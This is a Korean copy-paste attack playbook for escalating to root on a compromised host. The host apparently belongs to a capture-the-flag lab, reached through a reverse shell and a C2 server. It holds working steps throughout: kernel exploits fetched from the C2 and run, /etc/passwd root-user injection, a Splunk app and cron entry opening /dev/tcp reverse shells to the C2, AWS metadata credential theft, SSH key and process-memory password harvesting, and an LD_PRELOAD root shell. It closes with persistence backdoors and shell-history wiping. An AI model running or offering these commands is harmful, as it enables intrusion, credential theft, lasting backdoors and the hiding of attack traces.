# 복사 붙여넣기 명령어 모음

AWS 크레덴셜이 만료되어서 실패했으니, 이제 커널 익스플로잇으로 전환합니다.

---

## 🚀 지금 바로 실행 (복사해서 붙여넣기)

### 1️⃣ C2 서버에서 Exploit 준비

**C2 서버 (13.158.67.78, ubuntu@ip-10-0-3-106) 터미널에서:**

```bash
cd /tmp
git clone https://github.com/Liuk3r/CVE-2023-32233.git
cd CVE-2023-32233
gcc -o exploit exploit.c -static -lpthread
cd /tmp
python3 -m http.server 5000
```

---

### 2️⃣ 타겟 리버스 쉘에서 실행

**타겟 (리버스 쉘) 터미널에서:**

```bash
cd /tmp
wget http://13.158.67.78:5000/CVE-2023-32233/exploit 2>/dev/null
chmod +x exploit
./exploit
```

**성공하면 root 쉘 획득!**

---

## 실패시 대안 1: Looney Tunables (CVE-2023-4911)

### C2 서버:

```bash
cd /tmp
git clone https://github.com/leesh3288/CVE-2023-4911.git
cd CVE-2023-4911
make
gcc -o exploit exploit.c -static
```

### 타겟:

```bash
cd /tmp
ldd --version
env -i "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A" "Z=B" /usr/bin/su --help
wget http://13.158.67.78:5000/CVE-2023-4911/exploit
chmod +x exploit
./exploit
```

---

## 실패시 대안 2: 빠른 체크 스크립트

**타겟에서 전체 확인:**

```bash
cd /tmp
cat > full_check.sh << 'CHECKEOF'
#!/bin/bash
echo "=== 1. Kernel ==="
uname -r
echo ""

echo "=== 2. glibc ==="
ldd --version | head -1
echo ""

echo "=== 3. nf_tables ==="
lsmod | grep nf_tables
echo ""

echo "=== 4. ptrace ==="
cat /proc/sys/kernel/yama/ptrace_scope
echo ""

echo "=== 5. Writable /etc ==="
find /etc -writable -type f 2>/dev/null | head -10
echo ""

echo "=== 6. SUID ==="
find /usr/bin -perm -4000 2>/dev/null | head -10
echo ""

echo "=== 7. Capabilities ==="
getcap -r /usr/bin 2>/dev/null
echo ""

echo "=== 8. Docker ==="
groups | grep docker
test -w /var/run/docker.sock && echo "Docker socket writable!"
echo ""

echo "=== 9. Sudo processes ==="
ps aux | grep sudo | grep -v grep
echo ""

echo "=== 10. Cron ==="
find /etc/cron* -writable 2>/dev/null
CHECKEOF

bash full_check.sh
```

---

## 대안 3: /etc/passwd 직접 수정

```bash
test -w /etc/passwd && echo "WRITABLE!" || echo "Not writable"
```

**만약 WRITABLE이면:**

```bash
openssl passwd -1 -salt hacked hacked
echo 'hacked:생성된해시:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacked
```

---

## 대안 4: MySQL UDF (재시도)

```bash
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns

# MySQL에서:
SHOW VARIABLES LIKE 'plugin_dir';
SHOW VARIABLES LIKE 'secure_file_priv';
SELECT user, host, Super_priv, File_priv FROM mysql.user;

# FILE 권한 확인
```

---

## 대안 5: 다른 웹 취약점 찾기

```bash
# 웹 디렉토리 탐색
ls -la /var/www/html/
find /var/www/html -name "*.php" 2>/dev/null | head -20

# 관리자 페이지 찾기
find /var/www/html -name "*admin*" 2>/dev/null
find /var/www/html -name "*config*" 2>/dev/null

# DB에서 사용자 목록
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns -e "SELECT * FROM users;"

# 관리자 비밀번호 변경 (이미 했음)
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns -e "UPDATE users SET password='해시' WHERE username='admin';"
```

---

## 대안 6: Splunk 악용

```bash
# Splunk 프로세스 확인
ps aux | grep splunk

# Splunk 디렉토리
ls -la /opt/splunkforwarder/ 2>/dev/null
ls -la /opt/splunk/ 2>/dev/null

# Splunk 설정 파일
find /opt/splunk* -name "*.conf" 2>/dev/null | head -20

# Splunk가 root로 실행되는지 확인
ps aux | grep splunk | grep root
```

**만약 Splunk가 root로 실행되면:**

```bash
# Splunk app backdoor
mkdir -p /opt/splunk/etc/apps/backdoor/bin
cat > /opt/splunk/etc/apps/backdoor/bin/backdoor.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/13.158.67.78/4445 0>&1
EOF
chmod +x /opt/splunk/etc/apps/backdoor/bin/backdoor.sh

# Splunk 재시작 대기
```

---

## 대안 7: AWS 메타데이터 재시도

```bash
# 새 크레덴셜 가져오기
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
CREDS=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
echo $CREDS

# 첫번째 role 이름
ROLE=$(echo $CREDS | head -1)
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE 2>/dev/null
```

---

## 대안 8: SSH 키 찾기

```bash
# 모든 SSH 키 찾기
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# 읽기 가능한지 확인
find / -name "id_rsa" -readable 2>/dev/null

# 발견하면 복사
cat /path/to/id_rsa
```

---

## 대안 9: 프로세스 메모리 덤프

```bash
# Root 프로세스 찾기
ps aux | grep root | head -20

# /proc에서 환경변수 읽기
for pid in /proc/[0-9]*; do
    cat $pid/environ 2>/dev/null | strings | grep -i pass
done | head -20

# cmdline 확인
for pid in /proc/[0-9]*; do
    cat $pid/cmdline 2>/dev/null | strings | grep -i pass
done | head -20
```

---

## 대안 10: LD_PRELOAD

```bash
# evil.so 생성
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles 2>/dev/null

# 테스트
LD_PRELOAD=/tmp/evil.so /usr/bin/id

# 안되면 SUID 바이너리와 함께 시도
find / -perm -4000 2>/dev/null | head -10
LD_PRELOAD=/tmp/evil.so /usr/bin/SUID_binary
```

---

## 🎯 우선순위

1. **CVE-2023-32233** ⭐⭐⭐⭐⭐
2. **CVE-2023-4911** ⭐⭐⭐⭐
3. **Writable /etc** ⭐⭐⭐
4. **Splunk** ⭐⭐⭐
5. **SSH Keys** ⭐⭐
6. **LD_PRELOAD** ⭐⭐
7. **Process Memory** ⭐

---

## 📝 체크리스트

- [ ] CVE-2023-32233 시도
- [ ] CVE-2023-4911 시도
- [ ] Writable /etc/passwd 확인
- [ ] Splunk 확인
- [ ] SSH 키 찾기
- [ ] LD_PRELOAD 시도
- [ ] 프로세스 메모리 덤프
- [ ] 새 AWS 크레덴셜 가져오기
- [ ] Cron jobs 확인
- [ ] Capabilities 재확인

---

## 성공시 실행할 명령어

```bash
# Root 확인
whoami
id

# 플래그 찾기
find / -name "*flag*" -type f 2>/dev/null
cat /root/flag.txt
cat /home/*/flag.txt

# 백도어 설치 (SSH)
mkdir -p /root/.ssh
echo '여기에_공개키' >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# SUID bash
cp /bin/bash /tmp/.shell
chmod u+s /tmp/.shell

# Cron 백도어
echo '*/5 * * * * root bash -i >& /dev/tcp/13.158.67.78/4445 0>&1' >> /etc/crontab

# 흔적 제거
history -c
rm -f ~/.bash_history
```

---

## 🆘 막혔을 때

### 모든 방법이 실패하면:

1. **LinPEAS 재실행** (더 자세한 출력)
```bash
cd /tmp
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash > linpeas_full.txt 2>&1
cat linpeas_full.txt | grep -i "privilege"
```

2. **수동 열거**
```bash
# 모든 SUID
find / -perm -4000 -ls 2>/dev/null

# 모든 writable
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys

# 모든 capabilities
getcap -r / 2>/dev/null

# 네트워크 연결
netstat -tulnp 2>/dev/null
ss -tulnp 2>/dev/null
```

3. **다른 사용자로 pivot**
```bash
# 다른 사용자 확인
cat /etc/passwd | grep -v nologin | grep -v false

# SSH로 접근 가능한 사용자
cat /etc/ssh/sshd_config | grep -i allowusers
```

---

**핵심: CVE-2023-32233을 먼저 시도하세요!**
